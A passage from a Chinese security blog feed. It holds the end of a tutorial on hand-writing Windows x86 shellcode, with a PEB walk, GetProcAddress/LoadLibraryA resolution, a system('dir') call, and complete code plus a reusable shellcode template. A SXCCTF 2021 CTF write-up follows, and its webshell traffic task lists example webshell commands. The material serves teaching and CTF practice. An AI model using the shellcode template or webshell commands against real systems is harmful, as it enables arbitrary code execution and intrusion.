“LoadLibraryA”)</span><br></pre></td></tr></table></figure><p>注意：函数调用会把结果输出到eax寄存器中，那么eax中存储的就是LoadLibraryA函数的地址了</p><h2 id="3-3-获取system函数地址"><a href="#3-3-获取system函数地址" class="headerlink" title="3.3 获取system函数地址"></a>3.3 获取system函数地址</h2><p>因为我们已经获取到LoadLibraryA函数地址，所以我们可以利用他来导入相应的库，然后通过GetProcAddress来获取system函数地址，但是我们也得先保持栈平衡，再来保存eax里的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0x10    ; pop &quot;LoadLibraryA&quot;</span><br><span class="line">pop ecx         ; </span><br><span class="line">push eax        ; EAX &#x3D; LoadLibraryA of addr</span><br><span class="line"></span><br><span class="line">push 0x00</span><br><span class="line">push 0x00006c6c ;&quot;ll&quot;</span><br><span class="line">push 0x642e7472 ; &quot;rt.d&quot;</span><br><span class="line">push 0x6376736d ; &quot;msvc&quot;</span><br><span class="line">push esp        ; </span><br><span class="line">&quot;msvcrt.dll&quot;</span><br><span class="line">call eax        ; LoadLibrary(&quot;msvcrt.dll&quot;)</span><br><span class="line">add esp,0x10</span><br></pre></td></tr></table></figure><p>注意：现在eax中将保存着msvcrt.dll动态链接库的基地址</p><p>然后我们通过GetProcAddress来获取system函数的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov edx，[esp+4];现在esp上是LoadLibraryA_addr esp+4是GetProcAddress esp+8是Kernel32.dll of addr,eax是msvcrt.dll addr</span><br><span class="line"></span><br><span class="line">push 0x00006d65;&quot;em&quot;</span><br><span class="line">push 0x74737973;&quot;syst&quot;</span><br><span class="line">push esp;&quot;system&quot;</span><br><span class="line">push eax;</span><br><span class="line">call edx;</span><br><span class="line">add esp,0x10</span><br></pre></td></tr></table></figure><p>注意：现在eax中保存着system函数的地址</p><p>然后进行函数调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor ebx, ebx</span><br><span class="line">mov ebx,0x726964;&quot;dir&quot;</span><br><span class="line">push ebx</span><br><span class="line">push esp     </span><br><span class="line">call,eax</span><br><span class="line">add esp,8</span><br></pre></td></tr></table></figure><p>这里就基本上把shellcode完成了，但是还得把所有shellcode加在一起，还得调试更改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">;通过PEB表找到kernel32.dll base地址    </span><br><span class="line">  xor ecx, ecx    </span><br><span class="line">  mov eax, fs: [ecx + 0x30]     </span><br><span class="line">  mov eax, [eax + 0xc]    </span><br><span class="line">  mov esi, [eax + 0x14]    </span><br><span class="line">  lodsd    </span><br><span class="line">  xchg eax, esi    </span><br><span class="line">  lodsd    </span><br><span class="line">  mov ebx, [eax + 0x10]    </span><br><span class="line">  push ebx ;kernel32.dll of 入栈</span><br><span class="line">;通过kernel32.dll 的PE文件结构，找到AddressOfNames    </span><br><span class="line">  mov edx, [ebx + 0x3c]    </span><br><span class="line">  add edx, ebx    </span><br><span class="line">  mov edx, [edx + 0x78]    </span><br><span class="line">  add edx, ebx    </span><br><span class="line">  mov esi, [edx + 0x20]    </span><br><span class="line">  add esi, ebx    </span><br><span class="line">  xor ecx, ecx</span><br><span class="line">;通过addressofNames数组遍历得到GetProcAddress的索引</span><br><span class="line">Get_Function_GetProcAddress:   </span><br><span class="line">  inc ecx;    </span><br><span class="line">  lodsd    </span><br><span class="line">  add eax,ebx    </span><br><span class="line">  cmp dword ptr[eax],0x50746547    </span><br><span class="line">  jnz Get_Function_GetProcAddress    </span><br><span class="line">  cmp dword ptr[eax + 0x4], 0x41636f72    </span><br><span class="line">  jnz Get_Function_GetProcAddress    </span><br><span class="line">  cmp dword ptr[eax + 0x8], 0x65726464    </span><br><span class="line">  jnz Get_Function_GetProcAddress</span><br><span class="line">;通过AddressOfNameOrdinals加上索引，获得序号    </span><br><span class="line">  mov esi, [edx + 0x24]    </span><br><span class="line">  add esi, ebx    </span><br><span class="line">  mov cx, [esi + ecx * 2]    </span><br><span class="line">  dec ecx</span><br><span class="line">;通过AddressOfFunctions遍历序号获得GetProcAddress函数的地址    </span><br><span class="line">  mov esi, [edx + 0x1c]        </span><br><span class="line">  add esi, ebx               </span><br><span class="line">  mov edx, [esi + ecx * 4]     </span><br><span class="line">  add edx, ebx    </span><br><span class="line">  push edx ;GetProcAddress of addr入栈</span><br><span class="line">;通过Kernel32.dll of addr 和 Get   ProcAddress of addr 获得LoadLibraryA函数地址    </span><br><span class="line">  push 0x0    </span><br><span class="line">  push 0x41797261     </span><br><span class="line">  push 0x7262694c     </span><br><span class="line">  push 0x64616f4c     </span><br><span class="line">  push esp            </span><br><span class="line">  push ebx            </span><br><span class="line">  call edx    </span><br><span class="line">  add esp,0xc    </span><br><span class="line">  pop ecx    </span><br><span class="line">  push eax;LoadLibraryA of addr 入栈</span><br><span class="line">;导入msvcrt.dll文件    </span><br><span class="line">  add esp, 0x10    </span><br><span class="line">  push eax    </span><br><span class="line">  xor ecx,ecx    </span><br><span class="line">  push ecx    </span><br><span class="line">  mov cx, 0x6c6c    </span><br><span class="line">  push ecx    </span><br><span class="line">  push 0x642e7472    </span><br><span class="line">  push 0x6376736d    </span><br><span class="line">  push esp    </span><br><span class="line">  call eax</span><br><span class="line">;通过GetProcAddress函数，传入msvcrt.dll地址，找到system地址    </span><br><span class="line">  add esp, 0x10;    </span><br><span class="line">  mov edx, [esp + 0x4]    </span><br><span class="line">  xor ecx, ecx    </span><br><span class="line">  push ecx    </span><br><span class="line">  mov ecx, 0x616E6F74    </span><br><span class="line">  push ecx    </span><br><span class="line">  push 0x6d65    </span><br><span class="line">  push 0x74737973    </span><br><span class="line">  push esp;    </span><br><span class="line">  push eax;    </span><br><span class="line">  call edx;    </span><br><span class="line">  add esp,0x10</span><br><span class="line">;然后就是利用system函数去执行命令了    </span><br><span class="line">  xor ebx, ebx    </span><br><span class="line">  mov ebx, 0x726964    </span><br><span class="line">  push ebx    </span><br><span class="line">  push esp    </span><br><span class="line">  call eax</span><br><span class="line">;注意栈平衡就行    </span><br><span class="line">  add esp, 0x8    </span><br><span class="line">  popfd    </span><br><span class="line">  popad</span><br></pre></td></tr></table></figure><p>这里我只是去调用system函数，其他函数可以类推，我们只要拿到了GetProcAddress和LoadLibraryA这两个函数的地址，然后就天高任鸟飞了，实际的shellcode可能实际就封装成一个函数调用了</p><p>通过调试，需要去除push 0x0 这样的汇编会出现x00这样的空字节，会截断字符串，所以用了一个push 寄存器来代替，再加上一个推出函数。</p><p>调试………………….完整代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  _asm &#123;</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    mov eax, fs: [ecx + 0x30] </span><br><span class="line">    mov eax, [eax + 0xc]</span><br><span class="line">    mov esi, [eax + 0x14]</span><br><span class="line">    lodsd</span><br><span class="line">    xchg eax, esi</span><br><span class="line">    lodsd</span><br><span class="line">    mov ebx, [eax + 0x10]</span><br><span class="line">    push ebx</span><br><span class="line">    mov edx, [ebx + 0x3c]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov edx, [edx + 0x78]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov esi, [edx + 0x20]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">Get_Function_GetProcAddress:</span><br><span class="line">    inc ecx</span><br><span class="line">    lodsd</span><br><span class="line">    add eax, ebx</span><br><span class="line">    cmp dword ptr[eax], 0x50746547</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x4], 0x41636f72</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x8], 0x65726464</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    mov esi, [edx + 0x24]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov cx, [esi + ecx * 2]</span><br><span class="line">    dec ecx</span><br><span class="line">    mov esi, [edx + 0x1c]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov edx, [esi + ecx * 4]</span><br><span class="line">    add edx, ebx</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push edx</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x41797261</span><br><span class="line">    push 0x7262694c</span><br><span class="line">    push 0x64616f4c</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line"></span><br><span class="line">    add esp, 0x10</span><br><span class="line">    push eax</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    push ecx</span><br><span class="line">    mov cx, 0x6c6c</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x642e7472</span><br><span class="line">    push 0x6376736d</span><br><span class="line">    push esp</span><br><span class="line">    call eax;</span><br><span class="line"></span><br><span class="line">    add esp, 0x10;</span><br><span class="line">    mov edx, [esp + 0x4]</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx</span><br><span class="line">    mov ecx, 0x616E6F74</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x6d65</span><br><span class="line">    push 0x74737973</span><br><span class="line">    push esp;</span><br><span class="line">    push eax;</span><br><span class="line">    call edx;</span><br><span class="line">    add esp,0x10</span><br><span class="line"></span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov ebx, 0x726964</span><br><span class="line">    push ebx</span><br><span class="line">    push esp</span><br><span class="line">    call eax</span><br><span class="line">    add esp, 0xc</span><br><span class="line"></span><br><span class="line">    pop edx</span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, 0x61737365</span><br><span class="line">    push ecx</span><br><span class="line">    sub dword ptr[esp + 0x3], 0x61</span><br><span class="line">    push 0x636f7250</span><br><span class="line">    push 0x74697845</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx</span><br><span class="line">    call eax</span><br><span class="line">    ret</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从我们编写的汇编来看，代码逻辑很简单，就是要注意其中的堆栈平衡即可，从整个shellcode来看，前面找GetProcAddress和LoadLibraryA这两个函数是固定的，只要找到这两个，我们就能利用它们来查找任意的函数来执行，所以这里就总结出一个shellcode编写框架：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">    xor ecx, ecx</span><br><span class="line">    mov eax, fs: [ecx + 0x30] </span><br><span class="line">    mov eax, [eax + 0xc]</span><br><span class="line">    mov esi, [eax + 0x14]</span><br><span class="line">    lodsd</span><br><span class="line">    xchg eax, esi</span><br><span class="line">    lodsd</span><br><span class="line">    mov ebx, [eax + 0x10]</span><br><span class="line">    push ebx</span><br><span class="line">    mov edx, [ebx + 0x3c]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov edx, [edx + 0x78]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov esi, [edx + 0x20]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">Get_Function_GetProcAddress:</span><br><span class="line">    inc ecx</span><br><span class="line">    lodsd</span><br><span class="line">    add eax, ebx</span><br><span class="line">    cmp dword ptr[eax], 0x50746547</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x4], 0x41636f72</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x8], 0x65726464</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    mov esi, [edx + 0x24]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov cx, [esi + ecx * 2]</span><br><span class="line">    dec ecx</span><br><span class="line">    mov esi, [edx + 0x1c]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov edx, [esi + ecx * 4]</span><br><span class="line">    add edx, ebx</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push edx</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x41797261</span><br><span class="line">    push 0x7262694c</span><br><span class="line">    push 0x64616f4c</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line"></span><br><span class="line">    add esp, 0x10</span><br><span class="line">    push eax</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    push ecx</span><br><span class="line">    mov cx, 0x6c6c; ll</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x642e7472</span><br><span class="line">    push 0x6376736d</span><br><span class="line">    push esp</span><br><span class="line">    call eax;</span><br><span class="line">    add esp, 0x10;</span><br><span class="line"></span><br><span class="line">    ;这里填入想要执行的一些shellcode，这时候GetProcAddress和LoadLibraryA都在栈上，都可供调用。</span><br><span class="line">    ;esp LoadLibraryA_addr</span><br><span class="line">    ;esp+4 GetProcAddress</span><br><span class="line">    ;esp+8 Kernel32.dll</span><br><span class="line"></span><br><span class="line">    add esp, 0x8</span><br><span class="line">    pop edx</span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, 0x61737365</span><br><span class="line">    push ecx</span><br><span class="line">    sub dword ptr[esp + 0x3], 0x61</span><br><span class="line">    push 0x636f7250</span><br><span class="line">    push 0x74697845</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx</span><br><span class="line">    call eax</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>因为想着如果用调试器去截取shellcode很麻烦，然后自己用c++写了个小程序，用nasm来把汇编代码编译成机器码，实际效果：</p><p>在_asm文件中放入我们写好的shellcode，当然你也可以指定其他文件名：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/424431700.png"></p><p>然后执行程序 asm_shellcode.exe  文件名  位数（可不指定，默认32）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/84300700.png"></p><p>但是有一点得注意mov eax, fs: [ecx + 0x30] 会编译出错，必须得改成mov eax, [fs: ecx + 0x30] 才行，然后尝试加载shellcode执行</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/177087977.png"></p><p>这里就应该差不多了，一路套娃就行了。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SXCCTF 2021</title>
      <link href="2021/02/21/2021SXCCTF/"/>
      <url>2021/02/21/2021SXCCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><blockquote><p><a href="http://106.55.249.213/">http://106.55.249.213</a>:5002/<br>祝各位大佬，大大佬，新春快乐！<br>2021 更加牛13！！！</p></blockquote><p>flag在短片中：flag{Happy_New_Year_2021}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2208079998.png"></p><h5 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h5><h2 id="Flag不在这"><a href="#Flag不在这" class="headerlink" title="Flag不在这"></a>Flag不在这</h2><blockquote><p>Flag真的不在这，你要相信我，知道吗！</p></blockquote><p>打开显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag不在这！</span><br></pre></td></tr></table></figure><p>于是放入010发现是个压缩包，打开发现flag.txt：flag{It’s_real_easy!D0_Y0u_Like_it?}</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2526981304.png"></p><h2 id="牛年大吉"><a href="#牛年大吉" class="headerlink" title="牛年大吉"></a>牛年大吉</h2><blockquote><p>要相信自己，他就是flag！</p></blockquote><p>查看属性发现flag：flag{这个就是哦!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4097658638.png"></p><h2 id="网络深处"><a href="#网络深处" class="headerlink" title="网络深处"></a>网络深处</h2><blockquote><p>网络深处! 千万不要一个人大晚上做哦！！！</p></blockquote><p>原题就不写了.滑稽.jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.harvey.plus&#x2F;index.php&#x2F;Writeup&#x2F;2020UNCTF-%E5%85%AC%E5%BC%80%E8%B5%9B.html#%E7%BD%91%E7%BB%9C%E6%B7%B1%E5%A4%841</span><br></pre></td></tr></table></figure><h2 id="拼图"><a href="#拼图" class="headerlink" title="拼图"></a>拼图</h2><blockquote><p>你也喜欢鬼刀吗？</p></blockquote><p>montage合成 + gaps对大图遗传算法解拼图<br>①.<a href="https://download.imagemagick.org/ImageMagick/download/binaries/ImageMagick-7.0.11-0-Q16-HDRI-x64-dll.exe">montage</a>（Windows）（PS：将其改为1200X1200）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage &quot;D:\Harvey\赛题\SXCCTF\杂项\zip\拼图\*.png&quot; -tile 10x10 -geometry +0+0 result.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3446728363.png"></p><p>②.gaps（kali）解得flag：flag{123A4X5b6cLi}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装命令</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;nemanja-m&#x2F;gaps.git</span><br><span class="line">cd gaps</span><br><span class="line">sudo python3 setup.py install</span><br><span class="line">拼图命令</span><br><span class="line">gaps --image&#x3D;&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;result.png --generation&#x3D;30 --population&#x3D;300 --size&#x3D;120</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2116207182.png"></p><h2 id="Very-very-easy-hex"><a href="#Very-very-easy-hex" class="headerlink" title="Very very easy hex"></a>Very very easy hex</h2><blockquote><p>Very very easy hex!! Enjoy it!!!</p></blockquote><p>套娃解压缩包，先写个循环解压的脚本解出168张图<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2739945018.png"></p><p>附上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">zipname &#x3D; &quot;img.zip&quot;</span><br><span class="line">while True:</span><br><span class="line">    ts1 &#x3D; zipfile.ZipFile(zipname)</span><br><span class="line">    ts1.extractall(&quot;.&#x2F;&quot;)</span><br><span class="line">    zipname &#x3D; &quot;.&#x2F;&quot;+ts1.namelist()[0]</span><br></pre></td></tr></table></figure><p>解法一：菜鸡做法</p><p>接着发现这些图片hex就 04083A00 和 012040D0 两种格式</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/116661158497.png"></p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2561853733.png"></p><p>于是将其分别标注为0/1得到如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011001100110110001100001011001110111101101000100001100000101111101111001001100000111010101011111011011000110100101101011011001010101111101101001011101000011111101111101</span><br></pre></td></tr></table></figure><p>最后转成字符串得到flag：flag{D0_y0u_like_it?}<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4286024290.png"></p><p>解法二：大佬只需一个脚本梭哈QAQ</p><p>跑下脚本得到flag：flag{D0_y0u_like_it?}</p><p>附上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">binstr&#x3D;&#39;&#39;</span><br><span class="line">for i in range(168):</span><br><span class="line">    img&#x3D;Image.open(str(i)+&#39;.png&#39;)</span><br><span class="line">    char&#x3D;img.getpixel((0,0))</span><br><span class="line">    if char&#x3D;&#x3D;(0, 0, 0, 255):</span><br><span class="line">        binstr+&#x3D;&#39;0&#39;</span><br><span class="line">    else:</span><br><span class="line">        binstr+&#x3D;&#39;1&#39;</span><br><span class="line">    if len(binstr)&gt;&#x3D;8:</span><br><span class="line">        print(chr(int(binstr,2)),end&#x3D;&#39;&#39;)</span><br><span class="line">        binstr&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure><h2 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h2><blockquote><p>你会喜欢他的! :)</p></blockquote><p>原题by <a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020UNCTF#toc-heading-56">UNCTF2020-YLB绝密文件</a><br>不会复现.jpg</p><h2 id="Love-it"><a href="#Love-it" class="headerlink" title="Love_it!"></a>Love_it!</h2><blockquote><p>文件较大，选择网盘下载(手动狗头)<br>蓝奏：<a href="https://wws.lanzous.com/iy5T6lf343g">https://wws.lanzous.com/iy5T6lf343g</a> 密码:gbmf<br>百度云：链接: <a href="https://pan.baidu.com/s/1wT3bVls2X_5bOSBaxBK91A">https://pan.baidu.com/s/1wT3bVls2X_5bOSBaxBK91A</a> 提取码: ufrs 复制这段内容后打开百度网盘手机App，操作更方便哦</p><p>解压密码为：2021_jia_you!!<br>flag 为 flag{后台名称_后台账号_后台密码_一句话木马名称_一句话密码_第三个马子执行的命令}<br>例如：<br>后台网址为:<br><a href="http://127.0.0.1/admin/index.php">http://127.0.0.1/admin/index.php</a> 后台名称就为: admin<br>账号为：2021 后台账号为: 2021<br>密码为：happy_new_year! 后台密码为: happy_new_year!<br>一句话木马路径为: <a href="http://127.0.0.1/mu.php">http://127.0.0.1/mu.php</a> 一句话木马名称为: mu<br>一句话木马 一句话密码为: starsnow<br>一句话执行的命令<br>连接马子 之后执行的第三条 命令<br>第一条 yingzi=phpinfo();<br>第二条 yingzi=system(‘whoami’);<br>第三条 yingzi=system(‘ls’); 第三个马子执行的命令： system(‘ls’);</p><p>例如：<br>flag{admin_2021_happy_new_year!_starsnow_system(‘ls’);}</p></blockquote><p>由题可知流量里面有传马<br>于是在筛选http下进行搜集题目所要求的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后台名：dede；后台账号：admin；密码：starsnowniubi</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1628581112.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 